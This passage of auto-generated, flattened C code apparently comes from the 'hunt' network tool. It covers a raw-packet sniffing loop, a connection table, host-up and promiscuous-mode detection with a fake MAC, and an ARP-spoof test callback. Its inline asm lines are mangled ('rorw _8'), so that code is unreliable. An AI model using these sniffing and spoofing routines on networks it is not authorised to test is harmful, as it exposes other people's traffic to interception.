          host_ent=gethostbyaddr((const void *)(char *)&addr, (unsigned int)sizeof(struct in_addr) /*4ul*/ , 2);
          if(host_ent == ((struct hostent *)NULL))
            name=inet_ntoa(addr);

          else
            name = host_ent->h_name;
        }

        else
          name = r->name;
        break;
      }
      case 1:
      {
        r=resolv_get(in);
        if(r == ((struct resolv_item *)NULL))
        {
          resolv_request(in);
          name=inet_ntoa(addr);
        }

        else
          name = r->name;
        break;
      }
      case 0:

      default:
        name=inet_ntoa(addr);
    }
    unsigned long int return_value_strlen_2;
    return_value_strlen_2=strlen(name);
    len = (signed int)return_value_strlen_2;
    static signed int hostname_idx = 0;
    if((unsigned long int)(1 + hostname_idx + len) >= 513ul)
      hostname_idx = 0;

    static char hostname_buf[512l] = { (char)0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
    retval = hostname_buf + (signed long int)hostname_idx;
    strcpy(retval, name);
    hostname_idx = hostname_idx + len + 1;
    if(!(r == ((struct resolv_item *)NULL)))
      resolv_release(r);

    return retval;
  }
}

// host_up
// file hunt.h line 614
void host_up(void)
{
  unsigned int start_ip;
  unsigned int end_ip;
  struct ifunc_item ifunc_icmp;
  struct ifunc_item host_up__1__ifunc_arp;
  struct host_up_info *hui;
  struct timespec ts;
  unsigned int len;
  unsigned char buf_mac[512l];
  unsigned char fake_mac[6l];
  char *return_value_host_lookup_1;
  static unsigned int start_ip_def = (unsigned int)0;
  return_value_host_lookup_1=host_lookup(start_ip_def, 0);
  start_ip=menu_choose_hostname("start ip addr", return_value_host_lookup_1);
  _Bool tmp_if_expr_10;
  _Bool tmp_if_expr_11;
  _Bool tmp_if_expr_12;
  if(!(start_ip == 4294967295u))
  {
    char *return_value_host_lookup_2;
    static unsigned int end_ip_def = (unsigned int)0;
    return_value_host_lookup_2=host_lookup(end_ip_def, 0);
    end_ip=menu_choose_hostname("end ip addr", return_value_host_lookup_2);
    if(!(end_ip == 4294967295u))
    {
      unsigned int return_value___bswap_32_3;
      return_value___bswap_32_3=__bswap_32_link7(end_ip);
      unsigned int return_value___bswap_32_4;
      return_value___bswap_32_4=__bswap_32_link7(start_ip);
      len = (return_value___bswap_32_3 - return_value___bswap_32_4) + (unsigned int)1;
      {
        start_ip_def = start_ip;
        end_ip_def = end_ip;
        void *return_value_malloc_5;
        return_value_malloc_5=malloc(sizeof(struct host_up_info) /*48ul*/ );
        hui = (struct host_up_info *)return_value_malloc_5;
        hui->start_addr = start_ip;
        hui->end_addr = end_ip;
        void *return_value_malloc_6;
        return_value_malloc_6=malloc(sizeof(signed int) /*4ul*/  * (unsigned long int)len);
        hui->up_ping = (signed int *)return_value_malloc_6;
        void *return_value_malloc_7;
        return_value_malloc_7=malloc(sizeof(signed int) /*4ul*/  * (unsigned long int)len);
        hui->promisc_ping = (signed int *)return_value_malloc_7;
        void *return_value_malloc_8;
        return_value_malloc_8=malloc(sizeof(signed int) /*4ul*/  * (unsigned long int)len);
        hui->up_arp = (signed int *)return_value_malloc_8;
        void *return_value_malloc_9;
        return_value_malloc_9=malloc(sizeof(signed int) /*4ul*/  * (unsigned long int)len);
        hui->promisc_arp = (signed int *)return_value_malloc_9;
        hui->up_len = len;
        if(hui->up_ping == ((signed int *)NULL))
          tmp_if_expr_10 = (_Bool)1;

        else
          tmp_if_expr_10 = !(hui->promisc_ping != ((signed int *)NULL)) ? (_Bool)1 : (_Bool)0;
        if(tmp_if_expr_10)
          tmp_if_expr_11 = (_Bool)1;

        else
          tmp_if_expr_11 = !(hui->up_arp != ((signed int *)NULL)) ? (_Bool)1 : (_Bool)0;
        if(tmp_if_expr_11)
          tmp_if_expr_12 = (_Bool)1;

        else
          tmp_if_expr_12 = !(hui->promisc_arp != ((signed int *)NULL)) ? (_Bool)1 : (_Bool)0;
        if(tmp_if_expr_12)
          printf("bad rang\n");

        else
        {
          memset((void *)hui->up_ping, 0, sizeof(signed int) /*4ul*/  * (unsigned long int)len);
          memset((void *)hui->promisc_ping, 0, sizeof(signed int) /*4ul*/  * (unsigned long int)len);
          memset((void *)hui->up_arp, 0, sizeof(signed int) /*4ul*/  * (unsigned long int)len);
          memset((void *)hui->promisc_arp, 0, sizeof(signed int) /*4ul*/  * (unsigned long int)len);
          signed int return_value_menu_choose_char_13;
          return_value_menu_choose_char_13=menu_choose_char("host up test (arp method) y/n", "yn", (char)121);
          if(return_value_menu_choose_char_13 == 121)
          {
            host_up__1__ifunc_arp.func = func_arp_packet;
            host_up__1__ifunc_arp.arg = (void *)hui;
            list_enqueue(&l_ifunc_arp, (void *)&host_up__1__ifunc_arp);
            perform_arp(hui, 3, hui->up_arp, (unsigned char *)(void *)0);
            list_remove(&l_ifunc_arp, (void *)&host_up__1__ifunc_arp);
            packet_flush(&l_arp_packet);
            list_host_up(hui, hui->up_arp);
          }

          signed int return_value_menu_choose_char_14;
          return_value_menu_choose_char_14=menu_choose_char("host up test (ping method) y/n", "yn", (char)121);
          if(return_value_menu_choose_char_14 == 121)
          {
            printf("mac discovery\n");
            mac_discover_range(hui->start_addr, hui->end_addr, 2);
            ts.tv_sec = (signed long int)1;
            ts.tv_nsec = (signed long int)0;
            nanosleep(&ts, (struct timespec *)(void *)0);
            ifunc_icmp.func = func_icmp_packet;
            ifunc_icmp.arg = (void *)hui;
            list_enqueue(&l_ifunc_icmp, (void *)&ifunc_icmp);
            perform_ping(hui, 3, hui->up_ping, (unsigned char *)(void *)0);
            list_remove(&l_ifunc_icmp, (void *)&ifunc_icmp);
            packet_flush(&l_icmp_packet);
            list_host_up(hui, hui->up_ping);
          }

          signed int return_value_menu_choose_char_15;
          return_value_menu_choose_char_15=menu_choose_char("net ifc promisc test (arp method) y/n", "yn", (char)121);
          if(return_value_menu_choose_char_15 == 121)
          {
            unsigned char *return_value_suggest_mac_16;
            return_value_suggest_mac_16=suggest_mac();
            sprintf_eth_mac((char *)buf_mac, return_value_suggest_mac_16);
            signed int return_value_menu_choose_mac_17;
            return_value_menu_choose_mac_17=menu_choose_mac("choose unused MAC in your network", fake_mac, (char *)buf_mac);
            if(return_value_menu_choose_mac_17 >= 0)
            {
              host_up__1__ifunc_arp.func = func_arp_packet;
              host_up__1__ifunc_arp.arg = (void *)hui;
              list_enqueue(&l_ifunc_arp, (void *)&host_up__1__ifunc_arp);
              perform_arp(hui, 3, hui->promisc_arp, fake_mac);
              list_remove(&l_ifunc_arp, (void *)&host_up__1__ifunc_arp);
              packet_flush(&l_arp_packet);
              list_host_promisc(hui, hui->promisc_arp);
            }

            goto __CPROVER_DUMP_L17;
          }


        __CPROVER_DUMP_L17:
          ;
          signed int return_value_menu_choose_char_18;
          return_value_menu_choose_char_18=menu_choose_char("net ifc promisc test (ping method) y/n", "yn", (char)121);
          if(return_value_menu_choose_char_18 == 121)
          {
            unsigned char *return_value_suggest_mac_19;
            return_value_suggest_mac_19=suggest_mac();
            sprintf_eth_mac((char *)buf_mac, return_value_suggest_mac_19);
            signed int return_value_menu_choose_mac_20;
            return_value_menu_choose_mac_20=menu_choose_mac("choose unused MAC in your network", fake_mac, (char *)buf_mac);
            if(return_value_menu_choose_mac_20 >= 0)
            {
              ifunc_icmp.func = func_icmp_packet;
              ifunc_icmp.arg = (void *)hui;
              list_enqueue(&l_ifunc_icmp, (void *)&ifunc_icmp);
              perform_ping(hui, 3, hui->promisc_ping, fake_mac);
              list_remove(&l_ifunc_icmp, (void *)&ifunc_icmp);
              packet_flush(&l_icmp_packet);
              list_host_promisc(hui, hui->promisc_ping);
            }

            goto __CPROVER_DUMP_L20;
          }


        __CPROVER_DUMP_L20:
          ;
          free((void *)hui->up_ping);
          free((void *)hui->promisc_ping);
          free((void *)hui->up_arp);
          free((void *)hui->promisc_arp);
          free((void *)hui);
        }
      }
    }

  }

}

// ht_eq
// file hunt.c line 184
static signed int ht_eq(unsigned int key, struct conn_info *c, struct user_conn_info *uci)
{
  if(c->src_addr == uci->src_addr)
  {
    if(!(c->dst_addr == uci->dst_addr))
      goto __CPROVER_DUMP_L1;

    if(!(c->src_port == uci->src_port))
      goto __CPROVER_DUMP_L1;

    if(!(c->dst_port == uci->dst_port))
      goto __CPROVER_DUMP_L1;

    return 1;
  }

  else
  {

  __CPROVER_DUMP_L1:
    ;
    if(c->src_addr == uci->dst_addr)
    {
      if(!(c->dst_addr == uci->src_addr))
        goto __CPROVER_DUMP_L2;

      if(!(c->src_port == uci->dst_port))
        goto __CPROVER_DUMP_L2;

      if(!(c->dst_port == uci->src_port))
        goto __CPROVER_DUMP_L2;

      return 1;
    }

    else
    {

    __CPROVER_DUMP_L2:
      ;
      return 0;
    }
  }
}

// hunt
// file hunt.c line 728
void * hunt(void *arg)
{
  signed int i;
  char buff[1024l];
  struct packet *p;
  struct ethhdr *ethh;
  struct iphdr *iph;
  pthread_sigmask(0, &intr_mask, (struct anonymous_3 *)(void *)0);
  signed int return_value_getpid_1;
  if(!(verbose == 0))
  {
    return_value_getpid_1=getpid();
    printf("hunt pid %d\n", return_value_getpid_1);
  }

  add_telnet_rlogin_policy();
  signed int return_value_hash_init_2;
  return_value_hash_init_2=hash_init(&conn_table, 100, (signed int (*)(unsigned int, void *, void *))ht_eq);
  if(!(return_value_hash_init_2 == 0))
  {
    perror("hash_init");
    exit(1);
  }

  signed int return_value_hash_init_3;
  return_value_hash_init_3=hash_init(&mac_table, 100, (signed int (*)(unsigned int, void *, void *))(void *)0);
  if(!(return_value_hash_init_3 == 0))
  {
    perror("hash init");
    exit(1);
  }

  linksock=tap(eth_device, 1);
  if(!(linksock >= 0))
  {
    perror("linksock");
    exit(1);
  }

  packet_preallocate(64);
  printf("starting hunt\n");
  signed int return_value_getpid_4;
  return_value_getpid_4=getpid();
  setpriority(0, (unsigned int)return_value_getpid_4, -20);
  pthread_mutex_lock(&mutex_hunt_ready);
  hunt_ready = 1;
  pthread_cond_signal(&cond_hunt_ready);
  pthread_mutex_unlock(&mutex_hunt_ready);
  unsigned short int tmp_statement_expression_5;
  unsigned short int return_value_in_cksum_16;
  unsigned short int tmp_statement_expression_6;
  _Bool tmp_if_expr_8;
  unsigned short int tmp_statement_expression_7;
  _Bool tmp_if_expr_10;
  unsigned short int tmp_statement_expression_9;
  unsigned short int tmp_statement_expression_11;
  unsigned short int tmp_statement_expression_12;
  unsigned short int return_value_ip_in_cksum_13;
  unsigned short int tmp_statement_expression_14;
  unsigned short int return_value_in_cksum_15;
  while((_Bool)1)
  {
    p=packet_new();
    if(p == ((struct packet *)NULL))
    {
      fprintf(stderr, "can't get free packet - out of memory\n");
      exit(1);
    }

    signed long int return_value_recv_17;
    return_value_recv_17=recv(linksock, (void *)p->p_raw, sizeof(char [1514l]) /*1514ul*/ , 0);
    p->p_raw_len = (signed int)return_value_recv_17;
    if(p->p_raw_len >= 1)
    {
      pkts_received = pkts_received + 1u;
      bytes_received = bytes_received + (unsigned int)p->p_raw_len;
      if(!(p->p_raw_len >= 14))
        pkts_dropped = pkts_dropped + 1u;

      else
      {
        ethh = (struct ethhdr *)p->p_raw;
        p->p_ethh = ethh;
        p->p_timestamp = (signed long int)0;
        unsigned short int hunt__1__4__2__3____v;
        unsigned short int hunt__1__4__2__3____x = (unsigned short int)ethh->h_proto;
        asm("rorw _8, %w0" : "=r"(hunt__1__4__2__3____v) : "0"(hunt__1__4__2__3____x) : "cc");
        tmp_statement_expression_5 = hunt__1__4__2__3____v;
        switch((signed int)tmp_statement_expression_5)
        {
          case 0x0800:
          {
            p->p_timestamp=time((signed long int *)(void *)0);
            if(!(p->p_raw_len >= 14))
            {
              pkts_dropped = pkts_dropped + 1u;
              break;
            }

            iph = (struct iphdr *)((char *)ethh + (signed long int)sizeof(struct ethhdr) /*14ul*/ );
            i = 0;
            for( ; !((unsigned long int)i >= sizeof(struct iphdr) /*20ul*/ ); i = i + 1)
              buff[(signed long int)i] = p->p_raw[(signed long int)(sizeof(struct iphdr) /*20ul*/  + (unsigned long int)i)];
            iph = (struct iphdr *)(void *)buff;
            p->p_iph = iph;
            return_value_in_cksum_16=in_cksum((unsigned short int *)iph, (signed int)iph->ihl << 2);
            if((signed int)return_value_in_cksum_16 == 0)
            {
              if(!(mac_learn_from_ip == 0))
                mac_ip_learn(p);

              process_ip(p);
              unsigned short int hunt__1__4__2__4__3__1____v;
              unsigned short int __x = (unsigned short int)iph->frag_off;
              asm("rorw _8, %w0" : "=r"(hunt__1__4__2__4__3__1____v) : "0"(__x) : "cc");
              tmp_statement_expression_6 = hunt__1__4__2__4__3__1____v;
              if(!((0x1fff & (signed int)tmp_statement_expression_6) == 0))
                tmp_if_expr_8 = (_Bool)1;

              else
              {
                unsigned short int hunt__1__4__2__4__3__2____v;
                unsigned short int hunt__1__4__2__4__3__2____x = (unsigned short int)iph->frag_off;
                asm("rorw _8, %w0" : "=r"(hunt__1__4__2__4__3__2____v) : "0"(hunt__1__4__2__4__3__2____x) : "cc");
                tmp_statement_expression_7 = hunt__1__4__2__4__3__2____v;
                tmp_if_expr_8 = ((signed int)tmp_statement_expression_7 & 0x2000) != 0 ? (_Bool)1 : (_Bool)0;
              }
              if(tmp_if_expr_8)
                tmp_if_expr_10 = (_Bool)1;

              else
              {
                unsigned short int hunt__1__4__2__4__3__3____v;
                unsigned short int hunt__1__4__2__4__3__3____x = (unsigned short int)iph->tot_len;
                asm("rorw _8, %w0" : "=r"(hunt__1__4__2__4__3__3____v) : "0"(hunt__1__4__2__4__3__3____x) : "cc");
                tmp_statement_expression_9 = hunt__1__4__2__4__3__3____v;
                tmp_if_expr_10 = ((signed int)iph->ihl << 2) + ((signed int)tmp_statement_expression_9 - ((signed int)iph->ihl << 2)) > p->p_raw_len ? (_Bool)1 : (_Bool)0;
              }
              if(tmp_if_expr_10)
              {
                pkts_dropped = pkts_dropped + 1u;
                break;
              }

              switch((signed int)iph->protocol)
              {
                case 6:
                {
                  if(!(p->p_raw_len >= 14 + ((signed int)iph->ihl << 2)))
                  {
                    pkts_dropped = pkts_dropped + 1u;
                    goto cont;
                  }

                  p->p_type = (enum PACKET_TYPE)PACKET_TCP;
                  p->p_hdr.p_tcph = (struct tcphdr *)((char *)iph + (signed long int)((signed int)iph->ihl << 2));
                  p->p_data = (char *)p->p_hdr.p_tcph + (signed long int)((signed int)p->p_hdr.p_tcph->_anon0._anon1.doff << 2);
                  unsigned short int hunt__1__4__2__4__3__5__3____v;
                  unsigned short int hunt__1__4__2__4__3__5__3____x = (unsigned short int)iph->tot_len;
                  asm("rorw _8, %w0" : "=r"(hunt__1__4__2__4__3__5__3____v) : "0"(hunt__1__4__2__4__3__5__3____x) : "cc");
                  tmp_statement_expression_11 = hunt__1__4__2__4__3__5__3____v;
                  p->p_data_len = ((signed int)tmp_statement_expression_11 - ((signed int)iph->ihl << 2)) - ((signed int)p->p_hdr.p_tcph->_anon0._anon1.doff << 2);
                  unsigned short int hunt__1__4__2__4__3__5__4____v;
                  unsigned short int hunt__1__4__2__4__3__5__4____x = (unsigned short int)iph->tot_len;
                  asm("rorw _8, %w0" : "=r"(hunt__1__4__2__4__3__5__4____v) : "0"(hunt__1__4__2__4__3__5__4____x) : "cc");
                  tmp_statement_expression_12 = hunt__1__4__2__4__3__5__4____v;
                  return_value_ip_in_cksum_13=ip_in_cksum(iph, (unsigned short int *)p->p_hdr.p_tcph, (signed int)tmp_statement_expression_12 - ((signed int)iph->ihl << 2));
                  if((signed int)return_value_ip_in_cksum_13 == 0)
                  {
                    conn_update_table(p, ethh, iph);
                    fast_tcp_process(p);
                    process_tcp(p);
                  }

                  else
                    pkts_dropped = pkts_dropped + 1u;
                  break;
                }
                case 17:
                {
                  if(!(p->p_raw_len >= 8 + ((signed int)iph->ihl << 2)))
                  {
                    pkts_dropped = pkts_dropped + 1u;
                    goto cont;
                  }

                  p->p_type = (enum PACKET_TYPE)PACKET_UDP;
                  p->p_hdr.p_udph = (struct udphdr *)((char *)iph + (signed long int)((signed int)iph->ihl << 2));
                  p->p_data = (char *)p->p_hdr.p_udph + (signed long int)sizeof(struct udphdr) /*8ul*/ ;
                  process_udp(p);
                  break;
                }
                case 1:
                {
                  if(!(p->p_raw_len >= 8 + ((signed int)iph->ihl << 2)))
                  {
                    pkts_dropped = pkts_dropped + 1u;
                    goto cont;
                  }

                  p->p_type = (enum PACKET_TYPE)PACKET_ICMP;
                  p->p_hdr.p_icmph = (struct icmphdr *)((char *)iph + (signed long int)((signed int)iph->ihl << 2));
                  p->p_data = (char *)p->p_hdr.p_icmph + (signed long int)sizeof(struct icmphdr) /*8ul*/ ;
                  unsigned short int __v;
                  unsigned short int hunt__1__4__2__4__3__5__10____x = (unsigned short int)iph->tot_len;
                  asm("rorw _8, %w0" : "=r"(__v) : "0"(hunt__1__4__2__4__3__5__10____x) : "cc");
                  tmp_statement_expression_14 = __v;
                  return_value_in_cksum_15=in_cksum((unsigned short int *)p->p_hdr.p_icmph, (signed int)tmp_statement_expression_14 - ((signed int)iph->ihl << 2));
                  if((signed int)return_value_in_cksum_15 == 0)
                    process_icmp(p);

                  else
                    pkts_dropped = pkts_dropped + 1u;
                  break;
                }
                default:
                  pkts_unhandled = pkts_unhandled + 1u;
              }
            }

            else
              pkts_dropped = pkts_dropped + 1u;
            break;
          }
          case 0x0806:
          {
            if(!(p->p_raw_len >= 14))
            {
              pkts_dropped = pkts_dropped + 1u;
              break;
            }

            p->p_type = (enum PACKET_TYPE)PACKET_ARP;
            p->p_arph = (struct arphdr *)((char *)ethh + (signed long int)sizeof(struct ethhdr) /*14ul*/ );
            process_arp(p);
            p->p_timestamp=time((signed long int *)(void *)0);
            mac_arp_learn(p);
            break;
          }
          default:
            pkts_unhandled = pkts_unhandled + 1u;
        }
      }
    }


  cont:
    ;
    packet_free(p);
  }
  return (void *)0;
}

// hunt_arpspoof_test
// file arpspoof.c line 1339
static void hunt_arpspoof_test(struct packet *p, void *arg)
{
  struct arp_spoof_info *asi = (struct arp_spoof_info *)arg;
  struct iphdr *iph = p->p_iph;
  struct icmphdr *icmph = p->p_hdr.p_icmph;
  if(iph->saddr == asi->dst_addr)
  {
    if(iph->daddr == asi->src_addr)
    {
      if((signed int)icmph->type == 0)
      {
        if((signed int)icmph->code == 0)
        {
          packet_want(p);
          list_produce(&l_arpspoof_test, (void *)p);
        }

      }

    }

  }

}

// in_cksum
// file hunt.h line 420
unsigned short int in_cksum(unsigned short int *ptr, signed int nbytes)
{
  signed long int sum = (signed long int)0;
  unsigned short int oddbyte;
  unsigned short int *tmp_post_1;
  for( ; nbytes >= 2; nbytes = nbytes - 2)
  {
    tmp_post_1 = ptr;
    ptr = ptr + 1l;
    sum = sum + (signed long int)*tmp_post_1;
  }
  if(nbytes == 1)
  {
    oddbyte = (unsigned short int)0;
    *((unsigned char *)&oddbyte) = *((unsigned char *)ptr);
    sum = sum + (signed long int)oddbyte;
  }

  sum = (sum >> 16) + (sum & (signed long int)0xFFFF);
  return (unsigned short int)(~(sum + (sum >> 16)) & (signed long int)0xFFFF);
}

// init_modules
// file main.c line 409
static void init_modules(void)
{
  ;
}

// int_to_sdb
// file menu.c line 579
char int_to_sdb(signed int mode)
{
  char retval;
  switch(mode)
  {
    case 0:
    {
      retval = (char)115;
      break;
    }
    case 1:
    {
      retval = (char)100;
      break;
    }
    case 2:
    {
      retval = (char)98;
      break;
    }
    default:
      retval = (char)-1;
  }
  return retval;
}

// ip_in_cksum
// file hunt.h line 419
unsigned short int ip_in_cksum(struct iphdr *iph, unsigned short int *ptr, signed int nbytes)
{
  signed long int sum = (signed long int)0;
  unsigned short int oddbyte;
  signed int pheader_len;
  unsigned short int *pheader_ptr;
  /* ip_in_cksum::1::tag-pseudo_header */
struct pseudo_header
{
  // saddr
  unsigned long int saddr;
  // daddr
  unsigned long int daddr;
  // null
  unsigned char null;
  // proto
  unsigned char proto;
  // tlen
  unsigned short int tlen;
};

/* */
  ;
  struct pseudo_header pheader;
  pheader.saddr = (unsigned long int)iph->saddr;
  pheader.daddr = (unsigned long int)iph->daddr;
  pheader.null = (unsigned char)0;
  pheader.proto = iph->protocol;
  unsigned short int tmp_statement_expression_1;
  unsigned short int __v;
  unsigned short int __x = (unsigned short int)nbytes;
  asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
  tmp_statement_expression_1 = __v;
  pheader.tlen = tmp_statement_expression_1;
  pheader_ptr = (unsigned short int *)&pheader;
  pheader_len = (signed int)sizeof(struct pseudo_header) /*24ul*/ ;
  unsigned short int *tmp_post_2;
  for( ; !(pheader_len == 0); pheader_len = pheader_len - 2)
  {
    tmp_post_2 = pheader_ptr;
    pheader_ptr = pheader_ptr + 1l;
    sum = sum + (signed long int)*tmp_post_2;
  }
  unsigned short int *tmp_post_3;
  for( ; nbytes >= 2; nbytes = nbytes - 2)
  {
    tmp_post_3 = ptr;
    ptr = ptr + 1l;
    sum = sum + (signed long int)*tmp_post_3;
  }
  if(nbytes == 1)
  {
    oddbyte = (unsigned short int)0;
    *((unsigned char *)&oddbyte) = *((unsigned char *)ptr);
    sum = sum + (signed long int)oddbyte;
  }

  sum = (sum >> 16) + (sum & (signed long int)0xFFFF);
  return (unsigned short int)(~(sum + (sum >> 16)) & (signed long int)0xFFFF);
}

// is_icmp_reply
// file net.c line 183
signed int is_icmp_reply(struct packet *p, unsigned int src_addr, unsigned int dst_addr, char *src_mac, char *dst_mac)
{
  struct iphdr *iph = p->p_iph;
  struct icmphdr *icmph = p->p_hdr.p_icmph;
  struct ethhdr *ethh = p->p_ethh;
  unsigned short int seq;
  unsigned short int id;
  unsigned short int tmp_statement_expression_1;
  _Bool tmp_if_expr_4;
  signed int return_value_memcmp_3;
  if(iph->saddr == src_addr)
  {
    if(iph->daddr == dst_addr)
    {
      if((signed int)icmph->type == 0)
      {
        if((signed int)icmph->code == 0)
        {
          seq = (unsigned short int)((icmph->un.gateway & 0xFFFF0000) >> 16);
          id = (unsigned short int)(icmph->un.gateway & (unsigned int)0xFFFF);
          unsigned short int __v;
          unsigned short int __x = (unsigned short int)0xAA;
          asm("rorw _8, %w0" : "=r"(__v) : "0"(__x) : "cc");
          tmp_statement_expression_1 = __v;
          if(!(id == tmp_statement_expression_1))
            return 0;

          signed int return_value_memcmp_2;
          return_value_memcmp_2=memcmp((const void *)ethh->h_dest, (const void *)dst_mac, (unsigned long int)6);
          if(return_value_memcmp_2 == 0)
          {
            return_value_memcmp_3=memcmp((const void *)ethh->h_source, (const void *)src_mac, (unsigned long int)6);
            tmp_if_expr_4 = return_value_memcmp_3 == 0 ? (_Bool)1 : (_Bool)0;
          }

          else
            tmp_if_expr_4 = (_Bool)0;
          if(tmp_if_expr_4)
            return 1;

          else
            return 2;
        }

      }

    }

  }

  return 0;
}

// is_power2
// file util.c line 65
signed int is_power2(unsigned int i)
{
  for( ; (1u & i) == 0u; i = i >> 1)
    ;
  i = i >> 1;
  return i != 0u ? 0 : 1;
}

// lines_o_press_key
// file hunt.h line 609
void lines_o_press_key(void)
{
  press_key("press key");
}

// list_at
// file c/list.c line 226
void * list_at(struct list *l, signed int nr)
{
  void *retval;
  void *p;
  signed int i;
  __lock(l);
  p = l->l_first;
  i = 0;
  for( ; !(p == NULL) && !(i >= nr); i = i + 1)
    p = *((void **)((char *)p + (signed long int)l->l_off));
  if(!(p == NULL))
    retval = p;

  else
    retval = (void *)0;
  __unlock(l);
  return retval;
}

// list_conn_properties
// file options.c line 17
static void list_conn_properties(void)
{
  signed int c;
  signed int mac;
  signed int seq;
  c=menu_choose_char("print MAC y/n", "ny", (char)(conn_list_mac != 0 ? 121 : 110));
  switch(c)
  {
    case 110:
    {
      mac = 0;
      break;
    }
    case 121:
    {
      mac = 1;
      break;
    }
    default:
      goto __CPROVER_DUMP_L9;
  }
  c=menu_choose_char("print SEQ y/n", "ny", (char)(conn_list_seq != 0 ? 121 : 110));
  switch(c)
  {
    case 110:
    {
      seq = 0;
      break;
    }
    case 121:
    {
      seq = 1;
      break;
    }
    default:
      goto __CPROVER_DUMP_L9;
  }
  conn_list_mac = mac;
  conn_list_seq = seq;

__CPROVER_DUMP_L9:
  ;
}

// list_connections
// file main.c line 32
void list_connections(void)
{
  char *buf;
  char *__buf;
  char *b;
  signed int i = 0;
  clear_new_conn_ind();
  conn_list((struct user_conn_info **)(void *)0, &buf, conn_list_mac, conn_list_seq);
  if(!(buf == ((char *)NULL)))
  {
    __buf = buf;
    do
    {
      b=strtok(__buf, "\n");
      if(b == ((char *)NULL))
        break;

      __buf = (char *)(void *)0;
      printf("%s\n", b);
      i = i + 1;
      if(i % lines_o == 0)
        lines_o_press_key();

    }
    while((_Bool)1);
    free((void *)buf);
  }

  else
    printf("no connections are available\n");
}

// list_consume
// file c/list.h line 77
void * list_consume(struct list *l, struct timespec *absts)
{
  void *return_value___list_consume_1;
  return_value___list_consume_1=__list_consume(l, absts);
  return return_value___list_consume_1;
}

// list_consume_rel
// file c/list.c line 201
void * list_consume_rel(struct list *l, struct timespec *relts)
{
  struct timeval now;
  struct timespec absts;
  gettimeofday(&now, (struct timezone *)(void *)0);
  absts.tv_sec = now.tv_sec + relts->tv_sec;
  absts.tv_nsec = now.tv_usec * (signed long int)1000 + relts->tv_nsec;
  if(absts.tv_nsec >= 1000000000l)
  {
    absts.tv_nsec = absts.tv_nsec - (signed long int)1000000000;
    absts.tv_sec = absts.tv_sec + 1l;
  }

  void *return_value___list_consume_1;
  return_value___list_consume_1=__list_consume(l, &absts);
  return return_value___list_consume_1;
}

// list_count
// file c/list.h line 84
signed int list_count(struct list *l)
{
  signed int i;
  void *p;
  __lock(l);
  i = 0;
  p = l->l_first;
  for( ; !(p == NULL); p = *((void **)((char *)p + (signed long int)l->l_off)))
    i = i + 1;
  __unlock(l);
  return i;
}

// list_enqueue
// file c/list.h line 70
void list_enqueue(struct list *l, void *m)
{
  __lock(l);
  __enqueue(l, m);
  __unlock(l);
}

// list_flush
// file c/list.c line 46
void list_flush(struct list *l)
{
  struct list_iterator *i;
  __lock(l);
  l->l_last = (void *)0;
  l->l_first = l->l_last;
  i = l->l_iter;
  for( ; !(i == ((struct list_iterator *)NULL)); i = i->i_next)
    i->i_cur = (void *)0;
  __unlock(l);
}

// list_host_promisc
// file hostup.c line 210
static void list_host_promisc(struct host_up_info *hui, signed int *promisc)
{
  unsigned int addr;
  unsigned int idx;
  addr = hui->start_addr;
  unsigned int return_value___bswap_32_1;
  unsigned int return_value___bswap_32_2;
  _Bool tmp_if_expr_7;
  _Bool tmp_if_expr_10;
  _Bool tmp_if_expr_9;
  _Bool tmp_if_expr_8;
  unsigned int return_value___bswap_32_3;
  do
  {
    return_value___bswap_32_1=__bswap_32_link7(addr);
    return_value___bswap_32_2=__bswap_32_link7(hui->end_addr);
    if(!(return_value___bswap_32_2 >= return_value___bswap_32_1))
      break;

    unsigned int return_value___bswap_32_4;
